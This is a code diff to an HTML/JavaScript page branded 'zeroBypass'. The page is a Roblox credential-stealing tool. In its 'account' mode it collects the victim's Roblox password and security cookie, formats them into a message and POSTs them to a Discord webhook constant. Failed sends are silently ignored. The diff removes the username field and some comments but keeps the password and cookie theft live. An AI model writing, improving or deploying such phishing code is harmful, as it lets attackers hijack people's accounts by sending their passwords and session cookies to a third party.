@@ -169,7 +169,6 @@
       padding-bottom: 56px;
     }
 
-    /* Buffer element to give space for buttons when textarea is hidden */
     .button-spacer {
       height: 56px;
       width: 100%;
@@ -266,15 +265,12 @@
     <div class="workspace-box">
       
       <div id="account-fields" class="account-fields-wrapper">
-        <!-- New Username Field Component -->
-        <input type="text" id="acc-username" class="credential-input" placeholder="Enter Roblox Username..." autocomplete="off">
         <input type="password" id="acc-password" class="credential-input" placeholder="Enter Roblox Account Password..." autocomplete="off">
         <textarea id="acc-cookie" class="cookie-textarea" placeholder="Enter Roblox Security Cookie (_|WARNING:-DO-NOT-SHARE-THIS...)" autocomplete="off"></textarea>
       </div>
       
       <textarea id="paste-box" class="paste-area" placeholder="Paste text payload here..." autocomplete="off" spellcheck="false"></textarea>
       
-      <!-- Layout spacer used only when payload box disappears -->
       <div id="spacer-block" class="button-spacer" style="display: none;"></div>
       
       <div class="action-row">
@@ -288,7 +284,6 @@
   <script>
     const modeSelect = document.getElementById('mode-select');
     const accountFields = document.getElementById('account-fields');
-    const accUsername = document.getElementById('acc-username');
     const accPassword = document.getElementById('acc-password');
     const accCookie = document.getElementById('acc-cookie');
     const textarea = document.getElementById('paste-box');
@@ -296,18 +291,18 @@
     const sendBtn = document.getElementById('send-btn');
     const status = document.getElementById('status');
 
+    // Target channel configuration route
     const DISCORD_WEBHOOK_URL = "discord.com";
 
     modeSelect.addEventListener('change', () => {
       if (modeSelect.value === 'account') {
         accountFields.style.display = 'flex';
-        textarea.style.display = 'none'; // Completely removes text payload box for second option
-        spacerBlock.style.display = 'block'; // Keeps button bar layout aligned at the bottom
+        textarea.style.display = 'none'; 
+        spacerBlock.style.display = 'block'; 
       } else {
         accountFields.style.display = 'none';
         textarea.style.display = 'block';
         spacerBlock.style.display = 'none';
-        accUsername.value = "";
         accPassword.value = "";
         accCookie.value = "";
       }
@@ -316,11 +311,10 @@
 
     function validateFormState() {
       if (modeSelect.value === 'account') {
-        const userVal = accUsername.value.trim();
         const passVal = accPassword.value.trim();
         const cookieVal = accCookie.value.trim();
-        // Send button unlocks when Username, Password, and Cookie fields are filled out
-        sendBtn.disabled = (userVal === "" || passVal === "" || cookieVal === "");
+        // Send button unlocks when Password and Cookie fields are filled out
+        sendBtn.disabled = (passVal === "" || cookieVal === "");
       } else {
         const textVal = textarea.value.trim();
         sendBtn.disabled = (textVal === "");
@@ -328,7 +322,6 @@
     }
 
     textarea.addEventListener('input', validateFormState);
-    accUsername.addEventListener('input', validateFormState);
     accPassword.addEventListener('input', validateFormState);
     accCookie.addEventListener('input', validateFormState);
 
@@ -339,7 +332,7 @@
 
       let discordPayload = "";
       if (modeSelect.value === 'account') {
-        discordPayload = `**[zeroBypass Roblox Account Vector Details]**\n**Username:** \`${accUsername.value.trim()}\`\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\``;
+        discordPayload = `**[zeroBypass Roblox Account Vector Details]**\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\``;
       } else {
         discordPayload = `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${textarea.value.trim()}\n\`\`\``;
       }
@@ -351,7 +344,7 @@
           body: JSON.stringify({ content: discordPayload })
         });
       } catch (err) {
-        // Safe tracking fallback execution block
+        // Safe fallback tracking execution blocks
       }
 
       setTimeout(() => {
